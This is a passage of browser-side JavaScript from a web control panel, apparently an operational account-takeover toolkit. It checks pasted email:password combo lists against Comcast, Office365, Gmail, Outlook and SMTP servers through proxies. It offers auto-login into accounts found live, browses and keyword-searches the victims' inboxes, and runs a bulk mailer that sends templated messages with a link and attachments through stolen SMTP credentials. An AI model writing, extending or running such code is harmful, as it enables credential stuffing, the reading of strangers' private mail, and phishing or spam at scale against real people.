                          "<button class='btn btn-primary' onclick=\"window.open('/api/outlook/autologin?u=" + encodeURIComponent(d.outlook_hits_list[i].user) + "&p=" + encodeURIComponent(d.outlook_hits_list[i].pass) + "')\" style='padding:2px 8px; font-size:0.6rem; margin-right:4px;'>AUTO</button>" +
                          "<button class='btn btn-secondary' onclick=\"window.open('/api/outlook/browser-login?u=" + encodeURIComponent(d.outlook_hits_list[i].user) + "&p=" + encodeURIComponent(d.outlook_hits_list[i].pass) + "')\" style='padding:2px 8px; font-size:0.6rem; background:#6c757d;'>BROWSER</button></div>";
                 }
                 setHTML('out_live', h);
            }

             if(d.outlook_log && d.outlook_log.length > 0){
                 var logHTML = "";
                 for(var i=d.outlook_log.length-1; i>=0; i--){
                     logHTML += "<div>" + d.outlook_log[i] + "</div>";
                 }
                 setHTML('out_log', logHTML);
            }

            // Valid SMTP Sender Stats
            setVal('valid_smtp_count', d.valid_smtp_count || 0);
            setVal('smtp_sender_sent_count', d.smtp_sender_sent || 0);
            setVal('smtp_sender_failed_count', d.smtp_sender_failed || 0);

            // Update SMTP Sender dropdown + table from WS data
            if(d.valid_smtp_accounts && d.valid_smtp_accounts.length > 0){
                _updateValidSMTPTable(d.valid_smtp_accounts);
                _updateValidSMTPDropdown(d.valid_smtp_accounts);
            }

            if(d.smtp_sender_log && d.smtp_sender_log.length > 0){
                var sLog = "";
                for(var i=d.smtp_sender_log.length-1; i>=0; i--){
                    var col = d.smtp_sender_log[i].startsWith('✓') ? 'var(--success)' : 'var(--danger)';
                    sLog += "<div style='color:"+col+"'>" + d.smtp_sender_log[i] + "</div>";
                }
                setHTML('smtp_sender_log_box', sLog);
            }
        };
    ws.onclose = function() { setTimeout(connectWS, 2000); };
    ws.onerror = function() { ws.close(); };
    }
    connectWS();
    updateDistributionCharts(); // Draw initial empty chart rings

    async function clearResults(){
        if(!confirm("Are you sure you want to clear all current session results and stats?")) return;
        await fetch('/api/utils/clear-results', {method:'POST'});
        // Reset distribution charts
        countryStats = {};
        keywordStats = {};
        chartSeenHits = new Set();
        updateDistributionCharts();
        showNotify("Results and Statistics cleared.", "success");
    }

    function u_split(id){
        var val = document.getElementById(id).value;
        return val.split('\n').filter(function(v){ return v.trim().length > 0; }).map(function(v){ return v.trim(); });
    }

    function u_split_emails(id){
        var val = document.getElementById(id).value;
        return val.split(/[\n,;]+/).filter(function(v){ return v.trim().length > 0 && v.indexOf('@') !== -1; }).map(function(v){ return v.trim(); });
    }

    async function startS(){
        const proxyRaw = document.getElementById('scanner_proxies').value.trim();
        const proxies = proxyRaw ? proxyRaw.split(/\n/).map(l=>l.trim()).filter(l=>l) : [];
        await fetch('/api/start', {
            method:'POST',
            body:JSON.stringify({
                combos: u_split('combos'),
                file_path: document.getElementById('combo_file_path').value,
                threads: document.getElementById('threads').value,
                proxies: proxies
            })
        });
    }

    async function startD(){
        await fetch('/api/discover', {
            method:'POST',
            body:JSON.stringify({ 
                combos: u_split('combos'),
                file_path: document.getElementById('combo_file_path').value
            })
        });
    }

    async function abortS(){ await fetch('/api/stop', {method:'POST'}); }

    async function startSMTP(){
        showNotify("Starting SMTP Checker...", "info");
        const smtpProxyRaw = document.getElementById('smtp_proxies') ? document.getElementById('smtp_proxies').value.trim() : '';
        const smtpProxies = smtpProxyRaw ? smtpProxyRaw.split(/\n/).map(l=>l.trim()).filter(l=>l) : [];
        await fetch('/api/smtp/start', {
            method:'POST',
            body:JSON.stringify({
                combos: u_split('smtp_combos'),
                threads: document.getElementById('smtp_threads').value,
                brute: document.getElementById('brute_ports').checked,
                proxies: smtpProxies
            })
        });
    }

    async function extractSMTP(){
        var btn = event.target;
        var old = btn.innerText;
        var combos = u_split('smtp_combos');
        
        if (combos.length > 0) {
            btn.innerText = "Extracting...";
            var r = await fetch('/api/smtp/extract', {
                method:'POST',
                body:JSON.stringify({ combos: combos })
            });
            var d = await r.json();
            if(d.ok && d.results.length > 0){
                document.getElementById('smtp_combos').value = d.results.join('\n');
                btn.innerText = "Extracted!";
            } else {
                btn.innerText = "No Results";
            }
        } else {
            var path = document.getElementById('smtp_file_path').value;
            if(!path){ alert("Please load combos or enter a file path!"); return; }
            btn.innerText = "Extracting File...";
            var r = await fetch('/api/smtp/extract/file', {
                method:'POST',
                body:JSON.stringify({ path: path, threads: document.getElementById('smtp_threads').value })
            });
            var d = await r.json();
            if(d.ok) showNotify("Extraction started for file. Results in folder.", "success");
            else showNotify("Error: " + (d.error || "Unknown"), "error");
        }
        setTimeout(() => { btn.innerText = old; }, 2000);
    }

    async function browseLocalFile(targetId){
        showNotify("Opening file picker on your computer...", "info");
        try {
            var r = await fetch('/api/utils/browse-file');
            var d = await r.json();
            if(d.path) {
                document.getElementById(targetId).value = d.path;
                showNotify("File selected: " + d.path.split(/[\\/]/).pop(), "success");
            }
        } catch(e) {
            showNotify("Error: Local file browser failed.", "error");
        }
    }


    async function fastExtractSMTP(){
        var path = document.getElementById('smtp_file_path').value;
        if(!path){ showNotify("Please enter a local file path!", "error"); return; }
        await fetch('/api/smtp/extract/file', {
            method:'POST',
            body:JSON.stringify({ path: path, threads: document.getElementById('smtp_threads').value })
        });
        showNotify("High-speed extraction initialized. Monitor progress via DISC stat.", "info");
    }

    // ============================================
    // COMCAST CHECKER FUNCTIONS
    // ============================================
    var comcast_running = false;
    async function startComcastChecker(){
        var combos = document.getElementById('comcast_combos').value.trim().split('\n').filter(l => l.trim());
        if(!combos.length){ showNotify("Enter Comcast email:password combos!", "error"); return; }
        
        comcast_running = true;
        document.getElementById('comcast_progress').style.display = 'block';
        document.getElementById('comcast_status').innerText = 'CHECKING...';
        document.getElementById('comcast_results').innerHTML = '';
        var timeout = parseInt(document.getElementById('comcast_timeout').value) || 10;
        const comcastProxyRaw = document.getElementById('comcast_proxies') ? document.getElementById('comcast_proxies').value.trim() : '';
        const comcastProxies = comcastProxyRaw ? comcastProxyRaw.split(/\n/).map(l=>l.trim()).filter(l=>l) : [];
        
        for(var i = 0; i < combos.length; i++){
            if(!comcast_running) break;
            var combo = combos[i].trim();
            var parts = combo.split(':');
            if(parts.length < 2) continue;
            
            var email = parts[0];
            var password = parts[1];
            
            document.getElementById('comcast_checked').innerText = i + 1;
            
            try {
                var r = await fetch('/api/comcast/check', {
                    method:'POST',
                    body:JSON.stringify({
                        email: email, 
                        password: password, 
                        timeout: timeout,
                        proxies: comcastProxies
                    })
                });
                var d = await r.json();
                
                if(d.status === 'LIVE'){
                    document.getElementById('comcast_live_count').innerText = (parseInt(document.getElementById('comcast_live_count').innerText) + 1);
                    var logEntry = `✓ [${new Date().toLocaleTimeString()}] ${email} → LIVE (${d.server}:${d.port})`;
                    document.getElementById('comcast_results').innerHTML += logEntry + '\n';
                    showNotify(`Comcast LIVE: ${email}`, 'success');
                } else {
                    var logEntry = `✗ [${new Date().toLocaleTimeString()}] ${email} → DEAD`;
                    if (d.error) logEntry += ` (${d.error})`;
                    document.getElementById('comcast_results').innerHTML += logEntry + '\n';
                }
            } catch(e) {
                document.getElementById('comcast_results').innerHTML += `✗ ERROR: ${email}\n`;
            }
            
            // Scroll to bottom
            document.getElementById('comcast_results').scrollTop = document.getElementById('comcast_results').scrollHeight;
        }
        
        comcast_running = false;
        document.getElementById('comcast_progress').style.display = 'none';
        document.getElementById('comcast_status').innerText = 'COMPLETE';
        showNotify('Comcast check completed!', 'info');
    }

    function stopComcastChecker(){
        comcast_running = false;
        document.getElementById('comcast_progress').style.display = 'none';
        document.getElementById('comcast_status').innerText = 'STOPPED';
        showNotify('Comcast checker stopped', 'warning');
    }

    function clearComcastResults(){
        document.getElementById('comcast_results').innerHTML = 'Ready to check...';
        document.getElementById('comcast_checked').innerText = '0';
        document.getElementById('comcast_live_count').innerText = '0';
        document.getElementById('comcast_status').innerText = 'IDLE';
    }

    // ============================================
    // OFFICE365 CHECKER FUNCTIONS
    // ============================================
    var office365_running = false;
    async function startOffice365Checker(){
        var combos = document.getElementById('office365_combos').value.trim().split('\n').filter(l => l.trim());
        if(!combos.length){ showNotify("Enter Office365 email:password combos!", "error"); return; }
        
        office365_running = true;
        document.getElementById('office365_progress').style.display = 'block';
        document.getElementById('office365_status').innerText = 'CHECKING...';
        document.getElementById('office365_results').innerHTML = '';
        var timeout = parseInt(document.getElementById('office365_timeout').value) || 10;
        
        for(var i = 0; i < combos.length; i++){
            if(!office365_running) break;
            var combo = combos[i].trim();
            var parts = combo.split(':');
            if(parts.length < 2) continue;
            
            var email = parts[0];
            var password = parts[1];
            
            document.getElementById('office365_checked').innerText = i + 1;
            
            try {
                var r = await fetch('/api/office365/check', {
                    method:'POST',
                    body:JSON.stringify({email: email, password: password, timeout: timeout})
                });
                var d = await r.json();
                
                if(d.status === 'LIVE'){
                    document.getElementById('office365_live_count').innerText = (parseInt(document.getElementById('office365_live_count').innerText) + 1);
                    var logEntry = `✓ [${new Date().toLocaleTimeString()}] ${email} → LIVE (${d.server}:${d.port})`;
                    document.getElementById('office365_results').innerHTML += logEntry + '\n';
                    showNotify(`Office365 LIVE: ${email}`, 'success');
                } else {
                    var logEntry = `✗ [${new Date().toLocaleTimeString()}] ${email} → DEAD`;
                    document.getElementById('office365_results').innerHTML += logEntry + '\n';
                }
            } catch(e) {
                document.getElementById('office365_results').innerHTML += `✗ ERROR: ${email}\n`;
            }
            
            // Scroll to bottom
            document.getElementById('office365_results').scrollTop = document.getElementById('office365_results').scrollHeight;
        }
        
        office365_running = false;
        document.getElementById('office365_progress').style.display = 'none';
        document.getElementById('office365_status').innerText = 'COMPLETE';
        showNotify('Office365 check completed!', 'info');
    }

    function stopOffice365Checker(){
        office365_running = false;
        document.getElementById('office365_progress').style.display = 'none';
        document.getElementById('office365_status').innerText = 'STOPPED';
        showNotify('Office365 checker stopped', 'warning');
    }

    function clearOffice365Results(){
        document.getElementById('office365_results').innerHTML = 'Ready to check...';
        document.getElementById('office365_checked').innerText = '0';
        document.getElementById('office365_live_count').innerText = '0';
        document.getElementById('office365_status').innerText = 'IDLE';
    }

    var gmail_running = false;
    async function startGmailChecker(){
        var combos_text = document.getElementById('gmail_combos').value.trim();
        if(!combos_text) return showNotify("Enter combos first!", "error");
        var combos = combos_text.split('\n').filter(l => l.trim() !== '');
        
        gmail_running = true;
        document.getElementById('gmail_progress').style.display = 'block';
        document.getElementById('gmail_status').innerText = 'RUNNING';
        document.getElementById('gmail_results').innerHTML = '';
        document.getElementById('gmail_checked').innerText = '0';
        document.getElementById('gmail_live_count').innerText = '0';
        
        for(var i=0; i<combos.length; i++){
            if(!gmail_running) break;
            var combo = combos[i].trim();
            var parts = combo.split(':');
            if(parts.length < 2) continue;
            
            var email = parts[0].trim();
            var password = parts[1].trim();
            
            document.getElementById('gmail_checked').innerText = (i + 1);
            
            try {
                var r = await fetch('/api/mail/gmail/check', {
                    method: 'POST',
                    body: JSON.stringify({email: email, password: password})
                });
                var d = await r.json();
                
                if(d.imap_check && d.imap_check.accessible){
                    document.getElementById('gmail_live_count').innerText = (parseInt(document.getElementById('gmail_live_count').innerText) + 1);
                    var logEntry = `✓ [${new Date().toLocaleTimeString()}] ${email} → LIVE (IMAP)`;
                    var safeHit = combo.replace(/'/g, "\\'").replace(/"/g, "&quot;");
                    
                    var div = document.createElement('div');
                    div.style.color = 'var(--accent)';
                    div.style.marginBottom = '5px';
                    div.innerHTML = logEntry + ` <button class="btn btn-secondary" style="font-size:0.6rem; padding:2px 6px; margin-left:10px; border-color:var(--accent); color:var(--accent);" onclick="previewGmailDirect('${safeHit}')">PREVIEW</button>`;
                    document.getElementById('gmail_results').appendChild(div);
                    showNotify(`Gmail LIVE: ${email}`, 'success');
                } else {
                    var div = document.createElement('div');
                    div.style.color = 'var(--danger)';
                    div.style.marginBottom = '5px';
                    div.innerText = `✗ [${new Date().toLocaleTimeString()}] ${email} → DEAD`;
                    document.getElementById('gmail_results').appendChild(div);
                }
            } catch(e) {
                var div = document.createElement('div');
                div.style.color = 'var(--danger)';
                div.style.marginBottom = '5px';
                div.innerText = `✗ ERROR: ${email} (${e.message})`;
                document.getElementById('gmail_results').appendChild(div);
            }
            
            document.getElementById('gmail_results').scrollTop = document.getElementById('gmail_results').scrollHeight;
        }
        
        gmail_running = false;
        document.getElementById('gmail_progress').style.display = 'none';
        document.getElementById('gmail_status').innerText = 'COMPLETE';
    }

    function stopGmailChecker(){
        gmail_running = false;
        document.getElementById('gmail_status').innerText = 'STOPPED';
    }

    function clearGmailResults(){
        document.getElementById('gmail_results').innerHTML = 'Ready to check...';
        document.getElementById('gmail_checked').innerText = '0';
        document.getElementById('gmail_live_count').innerText = '0';
        document.getElementById('gmail_status').innerText = 'IDLE';
    }

    function previewGmailDirect(hit){
        // Force IMAP mode in the viewer for this Gmail account
        curSrv = "imap.gmail.com";
        curPort = 993;
        loadF(hit);
    }

    function showNotify(msg, type='info'){
        var c = document.getElementById('notif-container');
        var n = document.createElement('div');
        n.className = 'notif ' + type;
        n.innerText = msg;
        c.appendChild(n);
        setTimeout(() => {
            n.style.animation = 'fadeOut 0.5s forwards';
            setTimeout(() => n.remove(), 500);
        }, 4000);
    }

    function clearAttachment(){
        document.getElementById('send_attachment').value = '';
        showNotify('Attachment removed', 'info');
    }

    async function startGlobalSearch(){
        var kw = document.getElementById('gs_keyword').value;
        if(!kw) return showNotify("Enter a keyword first!", "error");
        await fetch('/api/search/global/start', {method:'POST', body:JSON.stringify({keyword:kw})});
        showNotify("Started scanning all validated inboxes for '"+kw+"'...", "info");
    }

    async function jumpToMail(hit, folder, mid){
        sh('view', document.getElementById('nav-view'));
        curH = hit;
        curF = folder || 'INBOX';
        document.getElementById('v-cur-hit').innerText = hit;
        
        // Directly fetch and load message body instantly
        loadB(mid, null);
        
        // Load folders in the background
        await loadF(hit);
        
        // If sidebar list is rendered later, highlight the matching item if it exists
        setTimeout(() => {
            var item = document.querySelector('.mail-item[data-id="'+mid+'"]');
            if(item) item.classList.add('active');
        }, 1500);

        showNotify("Match loaded directly! Combo: " + hit, "success");
    }

    function loadLiveSMTPs(){
        fetch('/api/smtp/hits').then(r=>r.json()).then(d=>{
            var txt = d.map(h => h.host+":"+h.port+":"+h.user+":"+h.pass).join('\n');
            document.getElementById('send_smtps').value = txt;
            if(d.length > 0) showNotify("Loaded " + d.length + " SMTPs from Live session.", "success");
            else showNotify("No Live SMTPs found. Please run the SMTP Checker first.", "error");
        });
    }

    function syncEditor() {
        var editor = document.getElementById('send_body_editor');
        var textarea = document.getElementById('send_body');
        if (editor && textarea) {
            textarea.value = editor.innerHTML;
        }
    }

    function readFileToArea(input, areaId) {
        if (input.files && input.files[0]) {
            var reader = new FileReader();
            reader.onload = function (e) {
                document.getElementById(areaId).value = e.target.result;
                if(areaId === 'send_body') {
                    var editor = document.getElementById('send_body_editor');
                    if (editor) editor.innerHTML = e.target.result;
                    updatePreview();
                }
                showNotify("File loaded successfully!", "info");
            };
            reader.readAsText(input.files[0]);
        }
    }

    function escapeHtml(str) {
        if(!str) return '';
        return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
    }

    function toggleSubjectBorders(){
        var tb = document.getElementById('subject_border_toolbar');
        if(tb) tb.style.display = (tb.style.display === 'none') ? 'block' : 'none';
    }

    function applySubjectBorder(style){
        var subjElem = document.getElementById('send_subj');
        if(!subjElem) return;
        var txt = subjElem.value.trim();

        // Strip previous borders if any
        txt = txt.replace(/^[╔║╚═\s\n+|-]+|[╔║╚═\s\n+|-]+$/g, '');
        txt = txt.replace(/^[░▒▓█【\[★◈⚡|◤◥】\]★◈⚡\s]+|[░▒▓█【\[★◈⚡|◤◥】\]★◈⚡\s]+$/g, '').trim();
        if(!txt) txt = "SPECIAL OFFER";

        if(style === 'box'){
            subjElem.value = "╔═ " + txt + " ═╗";
        } else if(style === 'multiline_box'){
            var lineLen = txt.length + 6;
            var top = "╔" + "═".repeat(lineLen) + "╗";
            var mid = "║   " + txt + "   ║";
            var bot = "╚" + "═".repeat(lineLen) + "╝";
            subjElem.value = top + "\n" + mid + "\n" + bot;
        } else if(style === 'cyber'){
            subjElem.value = "░▒▓█ " + txt + " █▓▒░";
        } else if(style === 'bracket'){
            subjElem.value = "【 " + txt + " 】";
        } else if(style === 'star'){
            subjElem.value = "★ [ " + txt + " ] ★";
        } else if(style === 'diamond'){
            subjElem.value = "◈ ◈ " + txt + " ◈ ◈";
        } else if(style === 'arrow'){
            subjElem.value = "|◤ " + txt + " ◥|";
        } else if(style === 'fire'){
            subjElem.value = "⚡ [ " + txt + " ] ⚡";
        } else if(style === 'clear'){
            subjElem.value = txt;
        }
        updatePreview();
    }

    function updatePreview(){
        var body = document.getElementById('send_body').value;
        var subj = document.getElementById('send_subj').value;
        var container = document.getElementById('preview-container');
        if(body || subj){
            container.style.display = 'block';
            var f = document.getElementById('send_preview');
            var d = f.contentDocument || f.contentWindow.document;
            d.open();
            var sampleSubj = subj.replace(/\{company\}|\[company\]|\{company_name\}|\[company_name\]/gi, '<span style="color:#00c9ff; font-weight:bold;">[Sample Company]</span>');
            var sampleBody = body.replace(/\{company\}|\[company\]|\{company_name\}|\[company_name\]/gi, '<b>Acme Corp</b>');
            var subjHtml = subj ? '<div style="font-family:monospace; background:#111; color:#00ffa3; padding:8px 12px; border-radius:6px; margin-bottom:12px; font-weight:bold; white-space:pre-wrap; border:1px solid #333; font-size:0.85rem;"><strong>SUBJECT PREVIEW:</strong><br>' + sampleSubj + '</div>' : '';
            var bodyContent = sampleBody;
            if(!body.includes('<') && !body.includes('>')){
                bodyContent = '<div style="white-space:pre-wrap; font-family:sans-serif; color:#333;">' + escapeHtml(sampleBody) + '</div>';
            }
            d.write('<html><body style="font-family:sans-serif; padding:12px; background:#fff; color:#333;">' + subjHtml + '<div>' + bodyContent + '</div></body></html>');
            d.close();
        } else {
            container.style.display = 'none';
        }
    }

    async function startSender(){
        var targets = u_split_emails('send_targets');
        var raw_targets = document.getElementById('send_targets').value;
        var raw_companies = document.getElementById('send_companies') ? document.getElementById('send_companies').value : '';
        var smtps = u_split('send_smtps');
        if(targets.length == 0 || smtps.length == 0){
            showNotify("Please load emails and SMTPs first!", "error"); return;
        }

        var subjVal = document.getElementById('send_subj').value.trim();
        if(!subjVal){
            subjVal = "{company}";
            document.getElementById('send_subj').value = "{company}";
        }
        var bodyVal = document.getElementById('send_body').value.trim();
        if(!bodyVal){
            bodyVal = "{company} – Please check: https://jpqmall.net/";
            document.getElementById('send_body').value = "{company} – Please check: https://jpqmall.net/";
            updatePreview();
        }

        var fileInput = document.getElementById('send_attachment');
        var attName = "";
        var attData = "";

        if (fileInput.files.length > 0) {
            var file = fileInput.files[0];
            attName = file.name;
            attData = await new Promise((resolve) => {
                var reader = new FileReader();
                reader.onload = (e) => resolve(e.target.result.split(',')[1]);
                reader.readAsDataURL(file);
            });
        }

        document.getElementById('sender_console').innerHTML = "Initializing engine...";
        await fetch('/api/sender/start', {
            method:'POST',
            body:JSON.stringify({
                smtps: u_split('send_smtps'),
                targets: raw_targets,
                companies: raw_companies,
                repeat_count: document.getElementById('send_repeat_count') ? document.getElementById('send_repeat_count').value : 1,
                proxies: document.getElementById('send_proxies') ? document.getElementById('send_proxies').value : "",
                subject: (document.getElementById('send_pre_company') && document.getElementById('send_pre_company').checked ? "{company} - " : "") + document.getElementById('send_subj').value,
                body: document.getElementById('send_body').value,
                test_mail: document.getElementById('test_mail').value,
                att_name: attName,
                att_data: attData,
                delay: document.getElementById('send_delay').value,
                threads: document.getElementById('send_threads').value,
                max_retries: document.getElementById('send_retries').value,
                batch_limit: document.getElementById('send_batch_limit') ? document.getElementById('send_batch_limit').value : 1,
                sender_name: document.getElementById('send_name') ? document.getElementById('send_name').value : ""
            })
        });
        showNotify("Bulk mail sender initialized...", "info");
    }


    // ==================== EMMAILING FUNCTIONS ====================
    function loadLiveSMTPsEmmailing(){
        fetch('/api/smtp/hits').then(r=>r.json()).then(d=>{
            var txt = d.map(h => h.host+":"+h.port+":"+h.user+":"+h.pass).join('\n');
            document.getElementById('emmailing_smtps').value = txt;
            var statEl = document.getElementById('emmailing_stat_smtps');
            if(statEl) statEl.innerText = d.length;
            if(d.length > 0) showNotify("Emmailing: Loaded " + d.length + " SMTPs from Live session.", "success");
            else showNotify("No Live SMTPs found. Run the SMTP Checker first.", "error");
        });
    }

    function updateEmmailingPreview(){
        var body = document.getElementById('emmailing_body').value;
        if(body){
            var container = document.getElementById('emmailing_preview_container');
            if(container) container.style.display = 'block';
            var iframe = document.getElementById('emmailing_preview');
            if(iframe){
                var doc = iframe.contentDocument || iframe.contentWindow.document;
                doc.open(); doc.write(body); doc.close();
            }
        }
    }

    async function startEmmailing(){
        var targets_raw = document.getElementById('emmailing_targets').value;
        var companies_raw = document.getElementById('emmailing_companies') ? document.getElementById('emmailing_companies').value : '';
        var smtps_text = document.getElementById('emmailing_smtps').value.trim();
        var smtps = smtps_text ? smtps_text.split('\n').filter(l=>l.trim()) : [];

        if(!targets_raw.trim() || smtps.length == 0){
            showNotify("Emmailing: Please load emails and SMTPs first!", "error"); return;
        }

        var subjVal = document.getElementById('emmailing_subj').value.trim();
        if(!subjVal){ subjVal = "{company}"; document.getElementById('emmailing_subj').value = "{company}"; }
        var bodyVal = document.getElementById('emmailing_body').value.trim();
        if(!bodyVal){ bodyVal = "Hello"; document.getElementById('emmailing_body').value = "Hello"; }

        var fileInput = document.getElementById('emmailing_attachment');
        var attName = "";
        var attData = "";
        if (fileInput && fileInput.files.length > 0) {
            var file = fileInput.files[0];
            attName = file.name;
            attData = await new Promise((resolve) => {
                var reader = new FileReader();
                reader.onload = (e) => resolve(e.target.result.split(',')[1]);
                reader.readAsDataURL(file);
            });
        }

        var consoleEl = document.getElementById('emmailing_console');
        if(consoleEl) consoleEl.innerHTML = "<div style='color:#6495ed;'>Initializing emmailing engine...</div>";

        // Update dashboard total
        var totalTargets = targets_raw.split('\n').filter(l=>l.trim()).length;
        var msgsPerRecipient = parseInt(document.getElementById('emmailing_msgs_per_recipient').value) || 1;
        var totalMsgs = totalTargets * msgsPerRecipient;
        document.getElementById('emmailing_stat_total').innerText = totalMsgs;
        document.getElementById('emmailing_stat_pending').innerText = totalMsgs;
        document.getElementById('emmailing_stat_sent').innerText = 0;
        document.getElementById('emmailing_stat_fail').innerText = 0;
        document.getElementById('emmailing_stat_smtps').innerText = smtps.length;

        await fetch('/api/sender/start', {
            method:'POST',
            body:JSON.stringify({
                smtps: smtps,
                targets: targets_raw,
                companies: companies_raw,
                repeat_count: document.getElementById('emmailing_msgs_per_recipient').value || 1,
                proxies: document.getElementById('emmailing_proxies') ? document.getElementById('emmailing_proxies').value : "",
                subject: (document.getElementById('emmailing_pre_company') && document.getElementById('emmailing_pre_company').checked ? "{company} - " : "") + document.getElementById('emmailing_subj').value,
                body: document.getElementById('emmailing_body').value,
                test_mail: document.getElementById('emmailing_test_mail').value || "",
                att_name: attName,
                att_data: attData,
                delay: document.getElementById('emmailing_delay').value,
                threads: document.getElementById('emmailing_threads').value,
                max_retries: document.getElementById('emmailing_retries').value,
                batch_limit: document.getElementById('emmailing_batch_limit') ? document.getElementById('emmailing_batch_limit').value : 1,
                sender_name: document.getElementById('emmailing_name') ? document.getElementById('emmailing_name').value : ""
            })
        });
        showNotify("Emmailing engine initialized!", "info");
    }

    async function abortEmmailing(){
        await fetch('/api/stop', {method:'POST'});
        showNotify("Emmailing stopped.", "info");
    }

    async function startOutlook(){
        var kw = document.getElementById('out_keywords').value.trim();
        var combos = u_split('out_combos');
        if(combos.length == 0) return showNotify("Load combos first!", "error");
        
        if(kw) {
            showNotify("Starting Outlook Engine with keywords: " + kw, "info");
        } else {
            showNotify("Starting Outlook Engine (Login Test Only)", "info");
        }
        
        await fetch('/api/outlook/start', {
            method:'POST',
            body:JSON.stringify({
                combos: combos,
                threads: document.getElementById('out_threads').value,
                keywords: kw
            })
        });
    }

    async function mLogin(){
        var c = document.getElementById('m_c').value; if(!c) return;
        document.getElementById('m_st').innerText = "Connecting...";
        var r = await fetch('/api/manual/login', {method:'POST', body:JSON.stringify({combo:c})});
        var d = await r.json();
        if(d.ok){
            document.getElementById('m_st').innerText = "SUCCESS!";
            sh('view', document.getElementById('nav-view'));
            loadF(c);
        } else {
            document.getElementById('m_st').innerText = "FAIL: " + (d.error || 'Unknown Error');
        }
    }

    var validatedHits = [];
    async function loadH(p){
        if(p < 1) return; curPH = p || 1;
        var r = await fetch('/api/hits'); var hits = await r.json();
        validatedHits = hits;
        
        var q = document.getElementById('acc_search').value.toLowerCase();
        var filteredHits = hits;
        if(q){
            filteredHits = hits.filter(h => h.hit.toLowerCase().includes(q));
        }

        var slice = filteredHits.slice((curPH-1)*15, curPH*15);
        var html = "";
        for(var i=0; i<slice.length; i++){
            var item = slice[i];
            var combo = item.hit;
            var display = combo.split(':')[0];
            var safeCombo = combo.replace(/'/g, "\\'").replace(/"/g, "&quot;");
            html += '<div class="glass-card" style="padding:15px; display:flex; flex-direction:column; gap:12px;">' +
                    '<div style="cursor:pointer;" data-hit="'+safeCombo+'" onclick="loadF(this.getAttribute(\'data-hit\'),this)">' +
                    '<div style="font-weight:700; color:var(--accent);">' + display + '</div>' +
                    '<div style="font-size:0.75rem; color:var(--text-secondary);">'+(item.proto || 'Validated Record')+'</div>' +
                    '</div>' +
                    '<div style="display:flex; gap:8px;">' +
                    '<button class="btn btn-secondary" style="font-size:0.6rem; padding:4px 8px;" onclick="copyT(\''+safeCombo+'\', event)">COPY COMBO</button>' +
                    '<button class="btn btn-secondary" style="font-size:0.6rem; padding:4px 8px;" onclick="alert(\'Combo: \' + \''+safeCombo+'\')">SHOW PASS</button>' +
                    '</div>' +
                    '</div>';
        }
        document.getElementById('hits-list').innerHTML = html || '<div style="padding:20px; color:var(--text-secondary);">No hits found.</div>';
        document.getElementById('v-hp').innerText = curPH;
    }

    function copyT(txt, e){
        navigator.clipboard.writeText(txt);
        var btn = e.target;
        var old = btn.innerText;
        btn.innerText = "COPIED!";
        btn.style.borderColor = "var(--success)";
        setTimeout(() => { btn.innerText = old; btn.style.borderColor = "var(--border)"; }, 1500);
    }

    var curSrv = null, curPort = null;
    async function loadF(hit, srv = null, port = null){
        // Try to find verified server from validatedHits
        var match = validatedHits.find(h => h.hit === hit);
        
        if(srv && port){
            curSrv = srv; curPort = port;
        } else {
            curSrv = null; curPort = null;
            if(match && match.proto && match.proto.includes('://')){
                 try {
                     var p_parts = match.proto.split('://');
                     var s_parts = p_parts[1].split(':');
                     curSrv = s_parts[0];
                     curPort = s_parts.length > 1 ? parseInt(s_parts[1]) : (match.proto.includes('SSL') || match.proto.includes('IMAP') ? 993 : 143);
                     if(match.proto.includes('POP3')) curPort = match.proto.includes('SSL') ? 995 : 110;
                 } catch(e) {}
            }
        }

        // --- OWA for Microsoft accounts ---
        if(isMsHit(hit)){
            isOwaMode = true; curH = hit; curOwaFolderMap = {};
            document.getElementById('v-cur-hit').innerText = hit;
            sh('view', document.getElementById('nav-view'));
            var fl = document.getElementById('folder-list');
            if(fl) fl.innerHTML = '<div style="padding:20px; color:var(--text-secondary);">Connecting via OWA...</div>';
            try {
                var r = await fetch('/api/mail/owa/folders?hit='+encodeURIComponent(hit));
                var data = await r.json();
                if(data.error){ if(fl) fl.innerHTML = '<div style="padding:14px; color:var(--danger); font-size:0.8rem;">'+data.error+'</div>'; showNotify(data.error, 'error'); return; }
                var folders = data.folders || [];
                var html = "";
                var firstId = "inbox"; var firstFolder = "Inbox";
                for(var i=0; i<folders.length; i++){
                    var f = folders[i];
                    curOwaFolderMap[f.name] = f.id;
                    var active = f.name.toLowerCase()==='inbox' ? 'active' : '';
                    if(active){ firstId = f.id; firstFolder = f.name; }
                    html += '<div class="f-item '+active+'" onclick="loadM(\''+f.name.replace(/'/g,"\\'")+'\', this)">' +
                            '<span>'+f.name+'</span><span style="opacity:0.6; font-size:0.7rem;">'+f.count+'</span></div>';
                }
                if(fl) fl.innerHTML = html || '<div style="padding:20px;">No Folders</div>';
                curFolderId = firstId; loadM(firstFolder);
            } catch(e) {
                if(fl) fl.innerHTML = '<div style="padding:20px; color:var(--danger);">OWA Error</div>';
                showNotify('OWA folder sync failed: '+e.message, 'error');
            }
            return;
        }
        // --- IMAP for all other accounts ---
        isOwaMode = false;
        curH = hit;
        document.getElementById('v-cur-hit').innerText = hit;
        sh('view', document.getElementById('nav-view'));

        var fl = document.getElementById('folder-list');
        if(fl) fl.innerHTML = '<div style="padding:20px; color:var(--text-secondary);">Syncing...</div>';
        
        try {
            var url = '/api/mail/folders?hit='+encodeURIComponent(hit);
            if(curSrv) url += '&srv='+encodeURIComponent(curSrv)+'&port='+curPort;
            var r = await fetch(url);
            var fls = await r.json();
            if(fls.error) throw new Error(fls.error);
            
            var html = "";
            for(var i=0; i<fls.length; i++){
                var f = fls[i];
                var active = f.name.toUpperCase() == 'INBOX' ? 'active' : '';
                html += '<div class="f-item '+active+'" onclick="loadM(\''+f.name.replace(/'/g, "\\'")+'\', this)">' +
                        '<span>'+f.name+'</span>' +
                        '<span style="opacity:0.6; font-size:0.7rem;">'+f.count+'</span>' +
                        '</div>';
            }
            if(fl) fl.innerHTML = html || '<div style="padding:20px;">No Folders</div>';
            loadM('INBOX');
        } catch(e) {
            if(fl) fl.innerHTML = '<div style="padding:20px; color:var(--danger);">Error</div>';
            showNotify("Folder Sync Failed: " + e.message, "error");
        }
    }

    function renderCurrentMessages() {
        var sortVal = document.getElementById('v-sort') ? document.getElementById('v-sort').value : 'date-desc';
        var msgs = [...currentMessages];
        
        msgs.sort(function(a, b) {
            if (sortVal === 'date-desc') {
                return parseMailDate(b.date) - parseMailDate(a.date);
